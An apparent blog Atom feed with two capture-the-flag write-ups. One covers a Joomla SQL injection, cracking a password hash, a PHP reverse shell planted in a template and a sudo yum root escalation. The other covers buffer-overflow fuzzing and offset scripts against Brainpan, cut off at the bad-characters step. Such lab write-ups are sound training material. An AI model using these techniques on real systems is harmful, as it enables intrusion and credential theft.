<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="https://darrynbrownfield.co.uk/tag/oscp/feed.xml" rel="self" type="application/atom+xml" />
  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
  <updated>2021-08-12T11:21:23+00:00</updated>
  <id>https://darrynbrownfield.co.uk/tag/oscp/feed.xml</id>

  
  
  

  
    <title type="html">Darryn Brownfield | </title>
  

  
    <subtitle>Infosec | Hacking | CTF</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">Daily Bugle Write Up</title>
      <link href="https://darrynbrownfield.co.uk/dailybugle" rel="alternate" type="text/html" title="Daily Bugle Write Up" />
      <published>2021-03-21T00:00:00+00:00</published>
      <updated>2021-03-21T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/dailybugle</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/dailybugle">&lt;p&gt;&lt;img src=&quot;/assets/images/dailybugle/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/dailybugle&quot;&gt;dailybugle&lt;/a&gt; is a hard rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; and part of the ‘Offensive Pentesting’ path I’m currently working through. Although rated hard I think this is more of a medium level box. I really enjoyed the priv esc element of this machine as although the steps required to exploit can be found easily its not simply a case of copying and pasting the steps from GTFObins.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.152.1. I started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└─$ sudo nmap -sC -sV -oA nmap/initial 10.10.152.1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-20 11:36 GMT
Nmap scan report for 10.10.152.1
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
  &lt;li&gt;3306 - MYSQL - Maria DB&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I started with port 80 and looked at the webpage. It’s obviously promoting #fakenews, Spider-Man would never rob a bank! The login form could be useful but I decide to keep looking around for now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dailybugle/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;nmap found a robots.txt so I had a look through these, /administrator jumps out as being the most interesting.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/administrator brings me to a Joomla login page. I haven’t got any creds yet so not much use. I tried some common credentials such as admin/admin and admin/password but they didn’t work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dailybugle/admin.png&quot; alt=&quot;admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran ffuf to see if I could find any other directories but couldn’t find anything.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.152.1/FUZZ -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.152.1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

templates               [Status: 301, Size: 237, Words: 14, Lines: 8]
media                   [Status: 301, Size: 233, Words: 14, Lines: 8]
modules                 [Status: 301, Size: 235, Words: 14, Lines: 8]
bin                     [Status: 301, Size: 231, Words: 14, Lines: 8]
plugins                 [Status: 301, Size: 235, Words: 14, Lines: 8]
includes                [Status: 301, Size: 236, Words: 14, Lines: 8]
language                [Status: 301, Size: 236, Words: 14, Lines: 8]
components              [Status: 301, Size: 238, Words: 14, Lines: 8]
cache                   [Status: 301, Size: 233, Words: 14, Lines: 8]
images                  [Status: 301, Size: 234, Words: 14, Lines: 8]
libraries               [Status: 301, Size: 237, Words: 14, Lines: 8]
tmp                     [Status: 301, Size: 231, Words: 14, Lines: 8]
layouts                 [Status: 301, Size: 235, Words: 14, Lines: 8]
administrator           [Status: 301, Size: 241, Words: 14, Lines: 8]
cli                     [Status: 301, Size: 231, Words: 14, Lines: 8]
                        [Status: 200, Size: 9255, Words: 441, Lines: 243]
:: Progress: [220546/220546] :: Job [1/1] :: 1340 req/sec :: Duration: [0:02:42] :: Errors: 0 ::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I wanted to check for any Joomla exploits but I first needed to find the version, a quick Google shows me I can find the version by browsing to: http://10.10.152.1/administrator/manifests/files/joomla.xml&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dailybugle/version.png&quot; alt=&quot;version&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;The web server is running Joomla 3.7.0, this is vulnerable to &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-8917&quot;&gt;CVE-2017-8917&lt;/a&gt;. There is a note on the TryHackMe task:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;Instead of using SQLMap, why not use a python script!&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Using Google I found a &lt;a href=&quot;https://github.com/NinjaJc01/joomblah-3/blob/master/joomblah.py&quot;&gt;script&lt;/a&gt; on Github. However when I run it, it doesn’t find any users and I get the following output.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Found table: b'fb9j5_users'
Extracting users from b'fb9j5_users'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The b indicates bytes, from the Python3 documentation:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Bytes literals are always prefixed with ‘b’ or ‘B’; they produce an instance of the bytes type instead of the str type. They may only contain ASCII characters; bytes with a numeric value of 128 or greater must be expressed with escapes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To fix the script I updated line 45 to the following:&lt;/p&gt;

&lt;p&gt;value = binascii.unhexlify(value).decode(“utf-8”)&lt;/p&gt;

&lt;p&gt;Now run I run the script I get a user account!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '{HASH REDCATED}', '', '']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I put the hash in a file called ‘hash’ and use hashcat to crack the password. I selected mode 3200 because I compared the hash to the hashcat &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;examples&lt;/a&gt; and it was in bcrypt format. The command I used was:&lt;/p&gt;

&lt;p&gt;hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt&lt;/p&gt;

&lt;p&gt;Once the password cracked I tried to log in to the machine using SSH but had no luck so I tried the Joomla Administrator portal and got in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dailybugle/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With CMS platforms I’ve seen techniques in the past of uploading reverse shell code to the template used to generate a shell, so I tried that first. Going to Extensions - Templates Menu, I added the pentestmonkey php &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell&quot;&gt;reverseshell&lt;/a&gt; code to the prostar template and updated with my Kali machines IP and port. I saved the template and opened the main index page.&lt;/p&gt;

&lt;p&gt;I got a shell as ‘apache’. Looking at the /var/www/html directory I found configuration.php, in here its a username and password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;public $user = 'root';        public $password = 'REDCATED';
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Checking /etc/passwd I can see a user jjameson, I try that username with the password found in the configuration.php file and get SSH access.&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Checking sudo -l, jjameson can run yum commands as sudo. &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFObins&lt;/a&gt; indicates I can use yum to escalate privilages to root however first I need a .rpm file. I followed the steps in this article by &lt;a href=&quot;https://medium.com/@klockw3rk/privilege-escalation-how-to-build-rpm-payloads-in-kali-linux-3a61ef61e8b2&quot;&gt;klockw3rk&lt;/a&gt; and got root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;[root@dailybugle ~]# id;hostname
id;hostname
uid=0(root) gid=0(root) groups=0(root)
dailybugle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="hard" />
      
        <category term="oscp" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Brainpan 1 Write Up</title>
      <link href="https://darrynbrownfield.co.uk/brainpain" rel="alternate" type="text/html" title="Brainpan 1 Write Up" />
      <published>2020-10-10T00:00:00+00:00</published>
      <updated>2020-10-10T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/brainpain</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/brainpain">&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/cover.png&quot; alt=&quot;brainpan&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Brainpan is a great OSCP practice room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. The box was first released on Vulnhub by &lt;a href=&quot;https://twitter.com/superkojiman&quot;&gt;superkojiman&lt;/a&gt; so full credit to you for a fantastic box that I’m sure has helped a lot of people prepare for the OSCP exam. I completed the room about 5 days before I took the OSCP exam and I think it really helped enforce what I had learnt on the course and kept the steps fresh in my mind.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]                                                                                                                             
└──╼ $sudo nmap -sC -sV -oA nmap/initial brainpan                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 12:16 BST                                                                                                             
Nmap scan report for brainpan                                                                                                                                          
Host is up (0.030s latency).                                                                                                                                                
Not shown: 998 closed ports                                                                                                                                                 
PORT      STATE SERVICE VERSION                                                                                                                                             
9999/tcp  open  abyss?                                                                                                                                                      
| fingerprint-strings:                                                                                                                                                      
|   NULL:                                                                                                                                                                   
|     _| _|                                                                                                                                                                 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|                                                                                                                     
|     _|_| _| _| _| _| _| _| _| _| _| _| _|                                                                                                                                 
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|                                                                                                                         
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=10/10%Time=5F81982F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,298,&quot;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20&amp;gt;&amp;gt;\x20&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.85 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 ports open 9999 and 10000.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Starting with 9999 I use netcat to look at the port.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $nc brainpan 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                            

                          &amp;gt;&amp;gt; test
                          ACCESS DENIED
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Port 9999 provides a banner with the name of the machine and also a input to enter a password.&lt;/p&gt;

&lt;p&gt;Port 10000 is a python http server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/web.png&quot; alt=&quot;brainpan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Navigating to the page just displays a image about safe coding. Nothing useful in the source either. I ran a gobuster to check for other directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $gobuster dir -u http://brainpan:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://brainpan:10000
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/10 12:25:40 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2020/10/10 12:29:46 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Only one, navigating to the directory presents a brainpan.exe file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/bin.png&quot; alt=&quot;bin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As I know this machine is based around buffer overflow its safe to assume this is the file I will need to analyse. I’m more comfortable working in Immunity Debugger on Windows for exploit development so I transfer the file over to my windows VM. I have a shared folder on my host machine that I can use to copy files between VM’s so I copy the file in to that folder on my ParrotOS machine and boot my Windows VM.&lt;/p&gt;

&lt;h3 id=&quot;exploit-development&quot;&gt;Exploit Development&lt;/h3&gt;

&lt;p&gt;Now I have the exe on my windows machine, I ran the file and as expected it appears to be the application I connected to on port 9999. From my Parrot machine I connect to my windows machine on port 9999.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/bin.png&quot; alt=&quot;brainpan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I get the same prompt. Next I opened Immunity Debugger and attached the brainpan service. (This step is repeated a lot during exploit development! Each time I run my exploit script I closed Immunity Debugger reopen and reattach the brainpan.exe)&lt;/p&gt;

&lt;h4 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h4&gt;

&lt;p&gt;Looking at the output from the exe console, the application is copying the input to a buffer. So first we need need to fuzz the application to see if we can crash the application and overwrite the buffer.&lt;/p&gt;

&lt;p&gt;I have created a very simple python script to fuzz the application. I updated my hosts file to connect to my windows VM rather than TryHackMe for now.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = &quot;A&quot; * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((&quot;brainpan&quot;,9999))
        s.recv(1024)
        s.send(buffer + &quot;\r\n&quot;)
        s.close()
        sleep(1)
        buffer = buffer + &quot;A&quot; * 100

    except:
       print(&quot;Fuzzing crashed at %s bytes&quot; % str(len(buffer)))
       sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The script will send 100 A’s to the application and will keep increasing the sent characters by 100 on each attempt. If the application crashes the script will fail and print out the length of A’s sent at the time of the crash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $sudo python exploit.py
Fuzzing crashed at 700 bytes
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script I can see it crashed at 700 bytes. Looking in Immunity debugger I can see the status is now showing ‘Paused’ rather than running indicating a crash.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/crash.png&quot; alt=&quot;crash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EIP is showing 41414141 which is AAAA so we have successfully overwrote EIP. If I can control EIP I may be able to exploit the application to create a reverse shell.&lt;/p&gt;

&lt;h4 id=&quot;find-offset&quot;&gt;Find Offset&lt;/h4&gt;

&lt;p&gt;The next step is to find the offset of the crash, I have successfully overwrote EIP but I need to determine the offset so I can accurately control the value inputted in to EIP. To find the offset I used the msf pattern create. This will create a cyclic pattern string of characters that I can put in to my script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msf-pattern_create -l 700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4A
f5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al
0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5
Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A
w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-l is to set the length of the string, the fuzzing script determined the application crashed at 700 bytes so I set the pattern to 700.&lt;/p&gt;

&lt;p&gt;I’ve updated the script with the string and also removed the while true as we are no longer fuzzing.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6A
k7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq
2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7
Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A&quot;

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script again crashes the application as excepted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/EIP-Crash.png&quot; alt=&quot;EIP-Crash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EIP now has a value of 35724134. I use msf pattern offset to determine the EIP offset.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msf-pattern_offset -l 700 -q 35724134
[*] Exact match at offset 524
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great the offset is 524. To make sure its correct I’ve updated the script with a buffer of 524 A’s, 4 B’s which is what will be shown as 42424242 in EIP and the remaining bytes as D’s. Ive also added a slight offset of 4 C’s&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

filler = &quot;A&quot; * 524
EIP = &quot;B&quot; * 4
offset = &quot;C&quot; * 4
junk = &quot;D&quot; * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran the exploit script again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/EIP.png&quot; alt=&quot;EIP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I now control EIP!&lt;/p&gt;

&lt;h4 id=&quot;bad-characters&quot;&gt;Bad Characters&lt;/h4&gt;

&lt;p&gt;Before I go any further I need to check for bad characters that could break the exploit. To do this I updated the script with the following string. Normally I remove /x00 as this is a null byte and will break the exploit however to show the process of identifying bad characters I have kept it in.&lt;/p&gt;

